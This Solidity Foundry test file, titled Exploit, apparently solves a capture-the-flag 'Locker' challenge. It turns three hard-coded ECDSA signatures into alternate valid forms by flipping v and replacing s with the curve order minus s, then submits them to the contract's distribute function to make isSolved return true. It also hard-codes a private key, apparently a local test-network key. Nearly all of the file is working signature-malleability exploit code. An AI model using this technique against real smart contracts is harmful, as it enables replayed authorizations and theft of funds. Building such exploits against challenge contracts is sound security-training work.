// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "src/Locker.sol";
// import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Test} from "forge-std/Test.sol";

contract Exploit is Test {
    address USER = makeAddr("Alice");
    uint256 constant STARTING_BALANCE = 10 ether;

    address public constant SETUP_ADDRESS =
        0x9f4d797F77C294dEec9457818798D28461BfDEEe;
    uint256 public constant PRIVATE_KEY =
        0xac27f4a05be35e2929195bd02e190250a4173f96c2a1256a869615ef498204a3;
    address public constant USER_ADDRESS =
        0xa0Ee7A142d267C1f36714E4a8F75612F20a79720;

    SetupLocker public setupLocker;
    Locker public locker;

    // constructor() {
    //     setup = SetupLocker(SETUP_ADDRESS);
    //     locker = Locker(setup.deploy());
    // }

    function setUp() external {
        setupLocker = new SetupLocker(USER_ADDRESS);
        locker = Locker(setupLocker.deploy());
        // vm.deal(USER, STARTING_BALANCE);
    }

    function testSignature() public {
        signature[] memory signatures = new signature[](3);
        (uint8 v1, bytes32 r1, bytes32 s1) = malleateSignature(27, 0x36ade3c84a9768d762f611fbba09f0f678c55cd73a734b330a9602b7426b18d9, 0x6f326347e65ae8b25830beee7f3a4374f535a8f6eedb5221efba0f17eceea9a9);
        (uint8 v2, bytes32 r2, bytes32 s2) = malleateSignature(28, 0x57f4f9e4f2ef7280c23b31c0360384113bc7aa130073c43bb8ff83d4804bd2a7, 0x694430205a6b625cc8506e945208ad32bec94583bf4ec116598708f3b65e4910);
        (uint8 v3, bytes32 r3, bytes32 s3) = malleateSignature(27, 0xe2e9d4367932529bf0c5c814942d2ff9ae3b5270a240be64b89f839cd4c78d5d, 0x6c0c845b7a88f5a2396d7f75b536ad577bbdb27ea8c03769a958b2a9d67117d2);
        signatures[0] = signature({
            v: v1,
            r: r1,
            s: s1
        });
        signatures[1] = signature({
            v: v2,
            r: r2,
            s: s2
        });
        signatures[2] = signature({
            v: v3,
            r: r3,
            s: s3
        });
        locker.distribute(signatures);
        assertEq(locker.isSolved(), true, "Not solved yet");
    }

    uint256 constant SECP256K1N =
        0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function malleateSignature(
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public pure returns (uint8, bytes32, bytes32) {
        uint8 vPrime = v == 27 ? 28 : 27;
        uint256 sInt = uint256(s);
        require(sInt <= SECP256K1N, "Invalid s value");
        uint256 sPrimeInt = SECP256K1N - sInt;
        bytes32 sPrime = bytes32(sPrimeInt);
        return (vPrime, r, sPrime);
    }
}
